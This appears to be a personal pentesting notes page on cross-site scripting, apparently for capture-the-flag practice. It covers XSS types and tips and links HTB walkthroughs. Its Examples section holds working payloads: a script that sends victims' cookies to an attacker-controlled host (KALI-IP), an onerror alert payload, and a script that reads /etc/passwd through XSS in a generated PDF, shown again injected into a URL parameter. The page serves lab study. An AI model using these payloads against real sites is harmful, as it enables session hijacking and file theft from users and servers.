
Cross Site Scripting (XSS) is a type of security vulnerability commonly found in web applications. It occurs when an attacker is able to inject malicious scripts into a legitimate website or web application, which can then be executed by unsuspecting users.  `XSS` is very similar to `HTML Injection` in practice. However, `XSS` involves the injection of `JavaScript` code to perform more advanced attacks on the client-side, instead of merely injecting HTML code. There are three main types of `XSS`:

|Type|Description|
|---|---|
|`Reflected XSS`|Occurs when user input is displayed on the page after processing (e.g., search result or error message).|
|`Stored XSS`|Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments).|
|`DOM XSS`|Occurs when user input is directly shown in the browser and is written to an `HTML` DOM object (e.g., vulnerable username or page title).|

XSS attacks can be used to steal sensitive information, such as login credentials or personal data, from users who visit the compromised site. They can also be used to deface websites, redirect users to malicious sites, or perform other malicious activities.


# Guide

1. Remember it relies on an external user and therefor may be unreliable, this may take time or multiple login attempts.
2. The value which gets displayed and can be modified may be in a strange place, check the URL and request parameters.

# Notes

[[Edge Side Include (ESI)]] is a manor of XXS which can bypass many XXS filters if ESI is being used by the website.

# Walkthrough

1. [HTB: Holiday | 0xdf hacks stuff](https://0xdf.gitlab.io/2019/09/11/htb-holiday.html)
2. [HTB: Bankrobber | 0xdf hacks stuff](https://0xdf.gitlab.io/2020/03/07/htb-bankrobber.html)

# Examples

## Stealing Cookies

```html
<html>
<body>
<script>
var r = new XMLHttpRequest();
r.open("GET", "http://KALI-IP/" + document.cookie);
r.send();
</script>
</body>
</html>
```

```javascript
#"><img src=/ onerror=alert(document.cookie)>
```

Sending this HTML to the website which will display it will steal the cookie from any user who views it.

## Running Code

[Local File Read via XSS in Dynamically Generated PDF](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html

```
<script>
	x=new XMLHttpRequest;
	x.onload=function(){
		document.write(this.responseText)
	};
	x.open("GET","file:///etc/passwd");
	x.send();
</script>
```

`https://xyz.com/payments/downloadStatements?Id=b9bc3d&utrnumber=<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>&date=2017-08-11&settlement_type=all&advice_id=undefined`